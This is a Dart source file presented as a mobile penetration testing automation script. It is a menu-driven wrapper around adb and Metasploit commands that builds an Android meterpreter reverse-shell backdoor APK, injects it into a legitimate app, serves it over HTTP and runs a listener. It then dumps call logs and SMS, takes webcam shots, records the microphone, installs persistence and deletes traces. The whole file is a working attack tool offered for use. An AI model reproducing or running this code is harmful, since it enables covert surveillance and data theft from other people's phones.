// Mobile Penetration Testing Automation Script
// Author: Muhammad Sudais Usmani
// Description: This script automates various tasks related to mobile pentesting.

import 'dart:io';

void runCommand(String command) {
  print('[+] Executing: \$command');
  ProcessResult result = Process.runSync('bash', ['-c', command]);
  print(result.stdout);
}

void checkADB() {
  runCommand('adb devices');
  runCommand('adb connect 192.168.170.101:5555');
}

void adbShellAccess() {
  runCommand('adb shell');
}

void generatePayload() {
  runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o backdoor.apk');
}

void injectPayload() {
  stdout.write("Enter path to original APK: ");
  String? originalAPK = stdin.readLineSync();
  if (originalAPK != null && originalAPK.isNotEmpty) {
    runCommand('msfvenom -x \$originalAPK -p android/meterpreter/reverse_tcp LHOST=192.168.130.129 LPORT=443 -o infected_app.apk');
  }
}

void startHTTPServer() {
  runCommand('python3 -m http.server 8080 &');
}

void startMSFListener() {
  runCommand("msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.130.129; set LPORT 443; exploit'");
}

void controlDevice() {
  runCommand("msfconsole -q -x 'sessions'");
  stdout.write("Enter session ID to interact with: ");
  String? sessionID = stdin.readLineSync();
  if (sessionID != null && sessionID.isNotEmpty) {
    runCommand("msfconsole -q -x 'sessions -i \$sessionID'");
  }
}

void extractData() {
  runCommand("msfconsole -q -x 'dump_calllog'");
  runCommand("msfconsole -q -x 'dump_sms'");
  runCommand("msfconsole -q -x 'webcam_snap'");
  runCommand("msfconsole -q -x 'record_mic 10'");
}

void maintainAccess() {
  runCommand("msfconsole -q -x 'run persistence -A'");
}

void clearTraces() {
  runCommand("adb shell rm /sdcard/backdoor.apk");
}

void main() {
  while (true) {
    print("\n[ Mobile Pentesting Automation ]");
    print("1) Check ADB Connection");
    print("2) Gain ADB Shell Access");
    print("3) Generate Malicious APK");
    print("4) Inject Payload into APK");
    print("5) Start HTTP Server for Deployment");
    print("6) Start Metasploit Listener");
    print("7) Control Compromised Device");
    print("8) Extract Data from Target");
    print("9) Maintain Access");
    print("10) Clear Traces");
    print("11) Exit");
    stdout.write("Choose an option: ");
    
    String? choiceInput = stdin.readLineSync();
    int? choice = int.tryParse(choiceInput ?? '');
    
    if (choice == null) {
      print("Invalid input, please enter a number.");
      continue;
    }
    
    switch (choice) {
      case 1:
        checkADB();
        break;
      case 2:
        adbShellAccess();
        break;
      case 3:
        generatePayload();
        break;
      case 4:
        injectPayload();
        break;
      case 5:
        startHTTPServer();
        break;
      case 6:
        startMSFListener();
        break;
      case 7:
        controlDevice();
        break;
      case 8:
        extractData();
        break;
      case 9:
        maintainAccess();
        break;
      case 10:
        clearTraces();
        break;
      case 11:
        print("Exiting...");
        return;
      default:
        print("Invalid option, please try again.");
        break;
    }
  }
}
